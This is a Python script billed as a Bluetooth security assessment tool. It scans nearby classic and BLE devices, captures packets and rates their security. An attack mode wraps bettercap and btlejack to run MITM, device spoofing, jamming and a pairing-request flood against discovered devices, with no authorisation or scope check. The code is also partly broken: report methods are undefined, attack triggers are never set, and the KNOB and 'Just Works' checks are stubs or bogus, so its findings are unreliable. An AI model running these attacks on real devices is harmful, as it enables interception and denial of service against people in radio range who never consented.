#!/usr/bin/env python3

import sys
import time
import logging
import argparse
import subprocess
from datetime import datetime
from typing import Dict, List, Optional
import bluetooth
from scapy.all import *
from bluepy.btle import Scanner, DefaultDelegate, Peripheral
from colorama import init, Fore, Style
import threading
import signal

# Initialize colorama for cross-platform colored output
init()

class BluetoothAttacker:
    """Handles advanced Bluetooth attack operations"""
    def __init__(self, logger):
        self.logger = logger
        self.attack_threads = []
        self.stop_attack = False

    def start_mitm_attack(self, target_addr: str):
        """Start MITM attack using bettercap"""
        try:
            cmd = [
                "bettercap",
                "-eval",
                f"ble.recon on; set ble.device {target_addr}; ble.mitm on"
            ]
            self.logger.info(f"{Fore.RED}[*] Starting MITM attack on {target_addr}{Style.RESET_ALL}")
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return process
        except Exception as e:
            self.logger.error(f"{Fore.RED}[-] MITM attack failed: {e}{Style.RESET_ALL}")
            return None

    def start_jamming(self, target_addr: str):
        """Start Bluetooth jamming attack"""
        def jamming_thread():
            try:
                cmd = ["btlejack", "-j", target_addr]
                self.logger.info(f"{Fore.RED}[*] Starting jamming attack on {target_addr}{Style.RESET_ALL}")
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                while not self.stop_attack:
                    time.sleep(1)
                process.terminate()
            except Exception as e:
                self.logger.error(f"{Fore.RED}[-] Jamming attack failed: {e}{Style.RESET_ALL}")

        thread = threading.Thread(target=jamming_thread)
        thread.start()
        self.attack_threads.append(thread)

    def spoof_device(self, target_addr: str, name: str):
        """Spoof a Bluetooth device"""
        try:
            cmd = [
                "bettercap",
                "-eval",
                f"ble.recon off; set ble.device {target_addr}; ble.spoof on name={name}"
            ]
            self.logger.info(f"{Fore.RED}[*] Starting device spoofing for {target_addr}{Style.RESET_ALL}")
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return process
        except Exception as e:
            self.logger.error(f"{Fore.RED}[-] Device spoofing failed: {e}{Style.RESET_ALL}")
            return None

    def flood_pairing_requests(self, target_addr: str):
        """Flood target with pairing requests"""
        def flood_thread():
            try:
                while not self.stop_attack:
                    peripheral = Peripheral(target_addr)
                    peripheral.disconnect()
                    time.sleep(0.1)
            except Exception as e:
                self.logger.error(f"{Fore.RED}[-] Pairing flood failed: {e}{Style.RESET_ALL}")

        thread = threading.Thread(target=flood_thread)
        thread.start()
        self.attack_threads.append(thread)

    def stop_all_attacks(self):
        """Stop all ongoing attacks"""
        self.stop_attack = True
        for thread in self.attack_threads:
            thread.join()
        self.attack_threads = []
        self.stop_attack = False

class BluetoothSecurityScanner:
    def __init__(self, scan_duration: int = 10):
        self.scan_duration = scan_duration
        self.logger = self._setup_logging()
        self.devices = {}
        self.ble_devices = {}
        self.attacker = BluetoothAttacker(self.logger)
        self.packet_capture_file = f'bluetooth_capture_{datetime.now().strftime("%Y%m%d_%H%M%S")}.pcap'
        
    def _setup_logging(self) -> logging.Logger:
        """Configure logging with colored output and file storage."""
        logger = logging.getLogger('BluetoothSecurity')
        logger.setLevel(logging.INFO)
        
        # Console handler with colored output
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        formatter = logging.Formatter(
            f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - '
            f'{Fore.GREEN}%(levelname)s{Style.RESET_ALL} - %(message)s'
        )
        console_handler.setFormatter(formatter)
        
        # File handler for detailed logging
        file_handler = logging.FileHandler(
            f'bluetooth_scan_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
        )
        file_handler.setLevel(logging.DEBUG)
        file_formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        )
        file_handler.setFormatter(file_formatter)
        
        logger.addHandler(console_handler)
        logger.addHandler(file_handler)
        return logger

    def discover_classic_devices(self):
        """Scan for classic Bluetooth devices."""
        self.logger.info(f"{Fore.BLUE}[*] Scanning for Classic Bluetooth devices...{Style.RESET_ALL}")
        try:
            nearby_devices = bluetooth.discover_devices(
                duration=self.scan_duration,
                lookup_names=True,
                lookup_class=True
            )
            
            for addr, name, device_class in nearby_devices:
                self.devices[addr] = {
                    'name': name,
                    'class': device_class,
                    'type': 'Classic',
                    'services': self.enumerate_services(addr)
                }
                self.logger.info(
                    f"{Fore.GREEN}[+] Found Classic Device:{Style.RESET_ALL} "
                    f"{name} ({addr}) - Class: {device_class}"
                )
        except Exception as e:
            self.logger.error(f"{Fore.RED}[-] Error scanning Classic Bluetooth: {e}{Style.RESET_ALL}")

    def enumerate_services(self, addr: str) -> List[Dict]:
        """Enumerate services for a classic Bluetooth device."""
        services = []
        try:
            for service_matches in bluetooth.find_service(address=addr):
                services.append({
                    'name': service_matches['name'],
                    'protocol': service_matches['protocol'],
                    'port': service_matches['port'],
                    'service-classes': service_matches['service-classes'],
                    'profiles': service_matches['profiles'],
                    'service-id': service_matches['service-id']
                })
        except Exception as e:
            self.logger.error(f"{Fore.RED}[-] Error enumerating services for {addr}: {e}{Style.RESET_ALL}")
        return services

    def start_packet_capture(self):
        """Start capturing Bluetooth packets using hcidump"""
        try:
            cmd = f"hcidump -w {self.packet_capture_file} -X"
            self.logger.info(f"{Fore.BLUE}[*] Starting packet capture: {self.packet_capture_file}{Style.RESET_ALL}")
            process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return process
        except Exception as e:
            self.logger.error(f"{Fore.RED}[-] Packet capture failed: {e}{Style.RESET_ALL}")
            return None

    def analyze_vulnerabilities(self, addr: str, device: Dict):
        """Perform detailed vulnerability analysis"""
        vulnerabilities = []
        
        # Check for Just Works pairing
        if self._test_just_works_pairing(addr):
            vulnerabilities.append("Vulnerable to Just Works pairing")
            
        # Check for KNOB attack vulnerability
        if self._test_knob_vulnerability(addr):
            vulnerabilities.append("Potentially vulnerable to KNOB attack")
            
        # Check encryption strength
        encryption_issues = self._check_encryption_strength(addr)
        if encryption_issues:
            vulnerabilities.extend(encryption_issues)
            
        return vulnerabilities

    def _test_just_works_pairing(self, addr: str) -> bool:
        """Test if device is vulnerable to Just Works pairing"""
        try:
            peripheral = Peripheral(addr)
            peripheral.disconnect()
            return True
        except:
            return False

    def _test_knob_vulnerability(self, addr: str) -> bool:
        """Test for KNOB attack vulnerability"""
        # This is a placeholder - actual KNOB testing requires specialized hardware
        return False

    def _check_encryption_strength(self, addr: str) -> List[str]:
        """Check encryption configuration"""
        issues = []
        try:
            cmd = f"btmgmt info {addr}"
            result = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT).decode()
            
            if "encryption=off" in result.lower():
                issues.append("No encryption enabled")
            elif "encryption=1" in result:
                issues.append("Using weak encryption (Version 1)")
                
        except Exception:
            pass
        return issues

class BLEDelegate(DefaultDelegate):
    def __init__(self, logger):
        DefaultDelegate.__init__(self)
        self.logger = logger

    def handleDiscovery(self, dev, isNewDev, isNewData):
        if isNewDev:
            self.logger.debug(f"Discovered new BLE device: {dev.addr}")
        elif isNewData:
            self.logger.debug(f"Received new data from {dev.addr}")

class BluetoothSecurityAssessment:
    def __init__(self):
        self.scanner = BluetoothSecurityScanner()
        
    def run_assessment(self):
        """Run the complete security assessment workflow."""
        self.scanner.logger.info(f"{Fore.YELLOW}[*] Starting Bluetooth Security Assessment{Style.RESET_ALL}")
        
        # Start packet capture
        capture_process = self.scanner.start_packet_capture()
        
        try:
            # Device Discovery Phase
            self.scanner.discover_classic_devices()
            self.scan_ble_devices()
            
            # Analysis Phase
            self.analyze_security_posture()
            
            # Attack Phase (if enabled)
            if self.attack_mode:
                self.perform_attacks()
            
            # Report Generation
            self.generate_report()
            
        finally:
            # Cleanup
            if capture_process:
                capture_process.terminate()
            self.scanner.attacker.stop_all_attacks()

    def scan_ble_devices(self):
        """Scan for BLE devices using bluepy."""
        self.scanner.logger.info(f"{Fore.BLUE}[*] Scanning for BLE devices...{Style.RESET_ALL}")
        try:
            scanner = Scanner().withDelegate(BLEDelegate(self.scanner.logger))
            devices = scanner.scan(self.scanner.scan_duration)
            
            for dev in devices:
                self.scanner.ble_devices[dev.addr] = {
                    'name': dev.getValueText(9) or "Unknown",
                    'rssi': dev.rssi,
                    'connectable': dev.connectable,
                    'adv_data': {
                        'manufacturer_data': dev.getValueText(255),
                        'complete_name': dev.getValueText(9),
                        'short_name': dev.getValueText(8),
                    }
                }
                self.scanner.logger.info(
                    f"{Fore.GREEN}[+] Found BLE Device:{Style.RESET_ALL} "
                    f"{dev.addr} (RSSI: {dev.rssi}dB)"
                )
        except Exception as e:
            self.scanner.logger.error(f"{Fore.RED}[-] Error scanning BLE devices: {e}{Style.RESET_ALL}")

    def analyze_security_posture(self):
        """Analyze the security posture of discovered devices."""
        self.scanner.logger.info(f"{Fore.YELLOW}[*] Analyzing device security posture...{Style.RESET_ALL}")
        
        for addr, device in self.scanner.devices.items():
            self._analyze_classic_device(addr, device)
            
        for addr, device in self.scanner.ble_devices.items():
            self._analyze_ble_device(addr, device)

    def _analyze_classic_device(self, addr: str, device: Dict):
        """Analyze security of classic Bluetooth device."""
        vulnerabilities = []
        
        # Check for common vulnerabilities
        if device['name'] and device['name'].lower() in ['hc-05', 'hc-06']:
            vulnerabilities.append("Default configuration detected - possible weak PIN")
        
        if device['services']:
            for service in device['services']:
                if service['protocol'] == 'RFCOMM':
                    vulnerabilities.append("RFCOMM service exposed - potential attack surface")

        if vulnerabilities:
            self.scanner.logger.warning(
                f"{Fore.YELLOW}[!] Vulnerabilities found for {addr}:{Style.RESET_ALL}\n" +
                "\n".join(f"  - {v}" for v in vulnerabilities)
            )

    def _analyze_ble_device(self, addr: str, device: Dict):
        """Analyze security of BLE device."""
        vulnerabilities = []
        
        if device['connectable']:
            vulnerabilities.append("Device is connectable - potential MITM attack vector")
        
        if device['rssi'] > -35:
            vulnerabilities.append("Very strong signal strength - possible proximity attack risk")

        if vulnerabilities:
            self.scanner.logger.warning(
                f"{Fore.YELLOW}[!] Vulnerabilities found for {addr}:{Style.RESET_ALL}\n" +
                "\n".join(f"  - {v}" for v in vulnerabilities)
            )

    def perform_attacks(self):
        """Perform configured attacks on vulnerable devices"""
        for addr, device in self.scanner.devices.items():
            if device.get('vulnerable_to_mitm'):
                self.scanner.attacker.start_mitm_attack(addr)
                
            if device.get('vulnerable_to_dos'):
                self.scanner.attacker.flood_pairing_requests(addr)

    def generate_report(self):
        """Generate a comprehensive security assessment report."""
        report_filename = f'security_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
        
        with open(report_filename, 'w') as f:
            f.write("Bluetooth Security Assessment Report\n")
            f.write("=" * 40 + "\n\n")
            
            # Device Information
            f.write("1. Discovered Devices\n")
            f.write("-" * 30 + "\n")
            self._write_device_section(f)
            
            # Vulnerability Analysis
            f.write("\n2. Vulnerability Analysis\n")
            f.write("-" * 30 + "\n")
            self._write_vulnerability_section(f)
            
            # Attack Results
            if self.attack_mode:
                f.write("\n3. Attack Results\n")
                f.write("-" * 30 + "\n")
                self._write_attack_section(f)
            
            # Recommendations
            f.write("\n4. Security Recommendations\n")
            f.write("-" * 30 + "\n")
            self._write_recommendations(f)

def main():
    parser = argparse.ArgumentParser(description='Bluetooth Security Assessment Tool')
    parser.add_argument('--duration', type=int, default=10,
                      help='Scan duration in seconds (default: 10)')
    parser.add_argument('--verbose', '-v', action='store_true',
                      help='Enable verbose output')
    parser.add_argument('--attack', '-a', action='store_true',
                      help='Enable active attack mode')
    parser.add_argument('--capture', '-c', action='store_true',
                      help='Enable packet capture')
    args = parser.parse_args()

    if args.verbose:
        logging.getLogger('BluetoothSecurity').setLevel(logging.DEBUG)

    assessment = BluetoothSecurityAssessment()
    assessment.attack_mode = args.attack
    assessment.run_assessment()

if __name__ == '__main__':
    main() 